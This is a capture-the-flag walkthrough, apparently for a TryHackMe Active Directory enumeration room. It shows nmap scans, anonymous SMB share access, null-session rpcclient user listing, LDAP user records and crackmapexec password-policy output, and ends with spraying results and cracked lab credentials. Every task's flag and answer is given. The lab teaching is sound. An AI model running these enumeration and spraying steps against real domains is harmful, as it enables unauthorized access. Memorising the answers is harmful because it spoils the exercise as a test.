> # AD: Basic Enumeration

## Summary
- [Summary](#summary)
  - [Task 2 - Mapping Out the Network](#task-2---mapping-out-the-network)
  - [Task 3 - Network Enumeration With SMB](#task-3---network-enumeration-with-smb)
  - [Task 4 - Domain Enumeration](#task-4---domain-enumeration)
  - [Task 5 - Password Spraying](#task-5---password-spraying)

### Task 2 - Mapping Out the Network
1. What is the domain name of our target?<br>
    ```
    $ nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 12:46 EDT
    Nmap scan report for 10.211.11.20
    Host is up (0.23s latency).

    PORT    STATE  SERVICE       VERSION
    88/tcp  closed kerberos-sec
    135/tcp open   msrpc         Microsoft Windows RPC
    139/tcp open   netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp closed ldap
    445/tcp open   microsoft-ds?
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: -6h59m36s
    | smb2-time: 
    |   date: 2025-05-24T09:47:49
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required

    Nmap scan report for 10.211.11.10
    Host is up (0.23s latency).

    PORT    STATE SERVICE      VERSION
    88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-24 09:47:30Z)
    135/tcp open  msrpc        Microsoft Windows RPC
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
    445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    |_clock-skew: mean: -6h59m34s, deviation: 2s, median: -6h59m36s
    | smb2-time: 
    |   date: 2025-05-24T09:47:47
    |_  start_date: N/A
    | smb-os-discovery: 
    |   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
    |   Computer name: DC
    |   NetBIOS computer name: DC\x00
    |   Domain name: tryhackme.loc
    |   Forest name: tryhackme.loc
    |   FQDN: DC.tryhackme.loc
    |_  System time: 2025-05-24T09:47:48+00:00

    Post-scan script results:
    | clock-skew: 
    |   -6h59m36s: 
    |     10.211.11.20
    |_    10.211.11.10
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 2 IP addresses (2 hosts up) scanned in 42.87 seconds
    ```
    **Answer:** tryhackme.loc

1. What version of Windows Server is running on the DC?<br>
    **Answer:** Windows Server 2019 Datacenter

### Task 3 - Network Enumeration With SMB
1. What is the flag hidden in one of the shares?<br>
    ```
    $ smbclient //10.211.11.10/UserBackups -N 
    Anonymous login successful
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Sat May 24 06:44:23 2025
    ..                                  D        0  Sat May 24 06:44:23 2025
    flag.txt                            A       14  Thu May 15 05:34:33 2025
    story.txt                           A      953  Thu May 15 05:37:57 2025

                    7863807 blocks of size 4096. 3474386 blocks available
    $ cat flag.txt 
    THM{88_SMB_88}
    ```
    **Answer:** THM{88_SMB_88}

### Task 4 - Domain Enumeration
1. What group is the user rduke part of?<br>
    ```
    # Raoul Duke, Users, tryhackme.loc
    dn: CN=Raoul Duke,CN=Users,DC=tryhackme,DC=loc
    objectClass: top
    objectClass: person
    objectClass: organizationalPerson
    objectClass: user
    cn: Raoul Duke
    sn: Duke
    givenName: Raoul
    distinguishedName: CN=Raoul Duke,CN=Users,DC=tryhackme,DC=loc
    instanceType: 4
    whenCreated: 20250513074600.0Z
    whenChanged: 20250513082225.0Z
    displayName: Raoul Duke
    uSNCreated: 69676
    uSNChanged: 69698
    name: Raoul Duke
    objectGUID:: NWLsrAinfE687hIoJA3Fow==
    userAccountControl: 66048
    badPwdCount: 0
    codePage: 0
    countryCode: 0
    badPasswordTime: 0
    lastLogoff: 0
    lastLogon: 133915981476381897
    pwdLastSet: 133915959609039319
    primaryGroupID: 513
    objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAMQoAAA==
    accountExpires: 9223372036854775807
    logonCount: 1
    sAMAccountName: rduke
    sAMAccountType: 805306368
    userPrincipalName: rduke@tryhackme.loc
    objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
    dSCorePropagationData: 20250514163924.0Z
    dSCorePropagationData: 16010101000001.0Z
    lastLogonTimestamp: 133915981456224520
    ```
    513 is `Domain Users` group.<br>
    **Answer:** Domain Users

1. What is this user's full name?<br>
    **Answer:** Raoul Duke

1. Which username is associated with RID 1634?<br>
    ```
    $ rpcclient -U "" 10.211.11.10 -N
    rpcclient $> enu
    enumalsgroups              enumdomains                enumdrivers                enumkey                    enumports                  enumprocdatatypes
    enumdata                   enumdomgroups              enumforms                  enummonitors               enumprinters               enumprocs
    enumdataex                 enumdomusers               enumjobs                   enumpermachineconnections  enumprivs                  enumtrust
    rpcclient $> enumdomusers 
    user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[sshd] rid:[0x649]
    user:[gerald.burgess] rid:[0x650]
    user:[nigel.parsons] rid:[0x651]
    user:[guy.smith] rid:[0x652]
    user:[jeremy.booth] rid:[0x653]
    user:[barbara.jones] rid:[0x654]
    user:[marion.kay] rid:[0x655]
    user:[kathryn.williams] rid:[0x656]
    user:[danny.baker] rid:[0x657]
    user:[gary.clarke] rid:[0x658]
    user:[daniel.turner] rid:[0x659]
    user:[debra.yates] rid:[0x65a]
    user:[jeffrey.thompson] rid:[0x65b]
    user:[martin.riley] rid:[0x65c]
    user:[danielle.lee] rid:[0x65d]
    user:[douglas.roberts] rid:[0x65e]
    user:[dawn.bolton] rid:[0x65f]
    user:[danielle.ali] rid:[0x660]
    user:[michelle.palmer] rid:[0x661]
    user:[katie.thomas] rid:[0x662]
    user:[jennifer.harding] rid:[0x663]
    user:[strategos] rid:[0x664]
    user:[empanadal0v3r] rid:[0x665]
    user:[drgonz0] rid:[0x666]
    user:[strate905] rid:[0x667]
    user:[krbtgtsvc] rid:[0x668]
    user:[asrepuser1] rid:[0x669]
    user:[rduke] rid:[0xa31]
    user:[user] rid:[0x1201]

    ```
    **Answer:** katie.thomas

### Task 5 - Password Spraying
1. What is the minimum password length?<br>
    ```
    rpcclient $> getdompwinfo
    min_password_length: 7
    password_properties: 0x00000001
            DOMAIN_PASSWORD_COMPLEX
    ```
    **Answer:** 7

1. What is the locked account duration?<br>
    ```
    $ crackmapexec smb 10.211.11.10 --pass-pol
    [*] First time use detected
    [*] Creating home directory structure
    [*] Creating default workspace
    [*] Initializing FTP protocol database
    [*] Initializing MSSQL protocol database
    [*] Initializing RDP protocol database
    [*] Initializing SMB protocol database
    [*] Initializing LDAP protocol database
    [*] Initializing WINRM protocol database
    [*] Initializing SSH protocol database
    [*] Copying default configuration file
    [*] Generating SSL certificate
    SMB         10.211.11.10    445    DC               [*] Windows Server 2019 Datacenter 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True)
    SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
    SMB         10.211.11.10    445    DC               Minimum password length: 7
    SMB         10.211.11.10    445    DC               Password history length: 24
    SMB         10.211.11.10    445    DC               Maximum password age: 41 days 23 hours 53 minutes 
    SMB         10.211.11.10    445    DC               
    SMB         10.211.11.10    445    DC               Password Complexity Flags: 000001
    SMB         10.211.11.10    445    DC                   Domain Refuse Password Change: 0
    SMB         10.211.11.10    445    DC                   Domain Password Store Cleartext: 0
    SMB         10.211.11.10    445    DC                   Domain Password Lockout Admins: 0
    SMB         10.211.11.10    445    DC                   Domain Password No Clear Change: 0
    SMB         10.211.11.10    445    DC                   Domain Password No Anon Change: 0
    SMB         10.211.11.10    445    DC                   Domain Password Complex: 1
    SMB         10.211.11.10    445    DC               
    SMB         10.211.11.10    445    DC               Minimum password age: 1 day 4 minutes 
    SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 2 minutes 
    SMB         10.211.11.10    445    DC               Locked Account Duration: 2 minutes 
    SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
    SMB         10.211.11.10    445    DC               Forced Log off Time: Not Set
    ```
    **Answer:** 2 minutes 

1. Perform password spraying using CrackMapExec. What valid credentials did you find? (format: username:password)<br>
    `SMB         10.211.11.20    445    WRK              [+] tryhackme.loc\rduke:Password1!`
    **Answer:** rduke:Password1!
